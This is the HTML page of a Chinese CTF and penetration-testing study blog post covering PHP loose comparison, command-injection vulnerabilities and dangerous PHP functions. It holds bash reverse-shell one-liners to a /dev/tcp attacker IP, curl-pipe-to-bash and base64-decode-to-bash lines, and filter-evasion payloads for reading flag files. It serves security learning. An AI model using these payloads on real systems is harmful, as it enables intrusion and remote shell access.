@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/blog_head.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/blog_head.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"m21in.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="弱类型·弱类型分为两种，一种是弱等于号 &#x3D;&#x3D;·一种是强等于号 &#x3D;&#x3D;&#x3D;弱等于号 &#x3D;&#x3D; 在进行比较的时候会进行类型转换，再进行比较强等于号 &#x3D;&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转换为相同类型，再进行比较如果是比较数字和字符串，或涉及到数字内容的字符串， 字符串会被转换成数值，并按照比较数值来进行比">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF&amp;渗透一些基础入门学习">
+<meta property="og:url" content="http://m21in.github.io/135d20d.html">
+<meta property="og:site_name" content="M21in的博客">
+<meta property="og:description" content="弱类型·弱类型分为两种，一种是弱等于号 &#x3D;&#x3D;·一种是强等于号 &#x3D;&#x3D;&#x3D;弱等于号 &#x3D;&#x3D; 在进行比较的时候会进行类型转换，再进行比较强等于号 &#x3D;&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转换为相同类型，再进行比较如果是比较数字和字符串，或涉及到数字内容的字符串， 字符串会被转换成数值，并按照比较数值来进行比">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-04-09T12:09:05.000Z">
+<meta property="article:modified_time" content="2025-05-07T01:38:30.642Z">
+<meta property="article:author" content="M21in">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="reverse">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://m21in.github.io/135d20d.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CTF&渗透一些基础入门学习 | M21in的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">M21in的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">分享和学习</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">4</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">10</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://m21in.github.io/135d20d.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/blog_head.jpg#/images/avatar.gif">
+      <meta itemprop="name" content="M21in">
+      <meta itemprop="description" content="用来记录生活和技术的地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M21in的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTF&渗透一些基础入门学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-04-09 20:09:05" itemprop="dateCreated datePublished" datetime="2025-04-09T20:09:05+08:00">2025-04-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-07 09:38:30" itemprop="dateModified" datetime="2025-05-07T09:38:30+08:00">2025-05-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/" itemprop="url" rel="index"><span itemprop="name">基础入门</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h1><p>·弱类型分为两种，一种是弱等于号 &#x3D;&#x3D;<br>·一种是强等于号 &#x3D;&#x3D;&#x3D;<br>弱等于号 &#x3D;&#x3D; 在进行比较的时候会进行类型转换，再进行比较<br>强等于号 &#x3D;&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转换为相同类型，再进行比较<br>如果是比较数字和字符串，或涉及到数字内容的字符串，<font color="red"> 字符串会被转换成数值，并按照比较数值来进行比较</font></p>
+<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><p>·命令执行是一种攻击，通过易受攻击的应用程序在主机操作系统上执行<font colo="red">恶意命令</font>。当用户可以控制执行函数中的参数时，可将恶意命令注入到正常命令中，从而导致命令执行漏洞。<br>·命令注入是常见的漏洞形态。一旦存在命令注入漏洞，攻击者可以在目标系统里执行任意命令。命令注入常用在向系统传入不安全的参数（命令执行参数、http头、cookie）<br>·命令执行继承Web Server用户的权限，一般都有权限写木马、存木马，查看隐私信息、窃取源码，反弹shell，危害很大<br>Linux系统的文件通常有三种权限：</p>
+<ol>
+<li>读权限：r 用数字代表4</li>
+<li>写权限：w 用数字代表2</li>
+<li>执行权限：x 用数字代表1<br>分别对当前的用户、同组其他用户、其他用户进行权限分配<br>chmod 可以进行权限分配</li>
+</ol>
+<h2 id="ps-ef-查看进程"><a href="#ps-ef-查看进程" class="headerlink" title="ps-ef 查看进程"></a>ps-ef 查看进程</h2><p>kill 进程号 杀死进程<br>kill -9 进程号 强制杀死进程<br>killall 进程名 杀死进程</p>
+<h3 id="杀死不死马"><a href="#杀死不死马" class="headerlink" title="杀死不死马"></a>杀死不死马</h3><p>ps -ef |grep “木马名”<br>kill -9 进程号</p>
+<h2 id="漏洞利用点"><a href="#漏洞利用点" class="headerlink" title="漏洞利用点"></a>漏洞利用点</h2><p>程序过滤不严谨，用户可以将代码注入并执行<br>高危函数eval()、assert()、preg_replace()、call_user_func()等等</p>
+<p>执行命令的函数，参数过滤不严谨，导致直接命令执行<br>如system()、exec()、shell_exec()、passthru()、pctnl_exec()、popen()、proc_open()等等<br>反引号是shell_exec()的别名</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `ls` 同等于 shell_exec(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
+<h3 id="换行符"><a href="#换行符" class="headerlink" title="换行符"></a>换行符</h3><p>%a,%d,%20,|,&amp; 都可以试试</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>渗透机电脑nc一个端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
+<p>靶机执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/渗透机的公网IP/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>如果没弹成功可以试试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 靶机的公网IP:8888 |bash</span><br></pre></td></tr></table></figure>
+<p>或者还可以对</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/渗透机的公网IP/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>进行base64加密，然后再</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|base64 -d |bash</span><br></pre></td></tr></table></figure>
+<p>也能达到同样的效果</p>
+<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">IFS</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">IFS<span class="variable">$9</span></span></span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">20</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">09</span></span><br></pre></td></tr></table></figure>
+<p>都可以试试</p>
+<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><pre class="line-numbers language-shell"><code class="language-shell">ca\t fla\g.php 反斜杠绕过
+cat f''lag.php 单引号绕过
+echo "命令" | base64 -d | bash 管道绕过/base64编码绕过
+echo "命令" | xxd -r -p | bash 管道绕过/xxd编码绕过,若为hex，xxd写成hexd
+cat flag* *匹配任意,或者?匹配任意一个字母
+cat fla[a-z]g.php 用[]匹配，可以匹配一个区间的字母，只显示一个字母的结果
+cat fla{a-z}g.php 内联执行
+cat fla{f..h}.php 这个命令会把f到h的所有字母都匹配一遍 并输出所有结果
+cat `ls` 查看当前目录下的所有文件
+
+
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" <i class="fa fa-tag"></i> web</a>
+              <a href="/tags/php/" <i class="fa fa-tag"></i> php</a>
+              <a href="/tags/python/" <i class="fa fa-tag"></i> python</a>
+              <a href="/tags/reverse/" <i class="fa fa-tag"></i> reverse</a>
+              <a href="/tags/pwn/" <i class="fa fa-tag"></i> pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/310f1bdd.html" rel="prev" title="SSTI学习">
+      <i class="fa fa-chevron-left"></i> SSTI学习
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+    </div>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.</span> <span class="nav-text">弱类型</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ps-ef-%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B"><span class="nav-number">2.1.</span> <span class="nav-text">ps-ef 查看进程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%80%E6%AD%BB%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="nav-number">2.1.1.</span> <span class="nav-text">杀死不死马</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%82%B9"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞利用点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8D%A2%E8%A1%8C%E7%AC%A6"><span class="nav-number">2.2.1.</span> <span class="nav-text">换行符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">2.2.2.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4"><span class="nav-number">2.2.3.</span> <span class="nav-text">过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="nav-number">2.2.3.1.</span> <span class="nav-text">过滤空格</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">2.2.3.2.</span> <span class="nav-text">过滤关键字</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="M21in"
+      src="/images/blog_head.jpg#/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">M21in</p>
+  <div class="site-description" itemprop="description">用来记录生活和技术的地方</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=483937795&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">M21in</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+<!-- 代码块复制功能 -->
+<script type="text/javascript" src="/js/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/clipboard-use.js"></script>
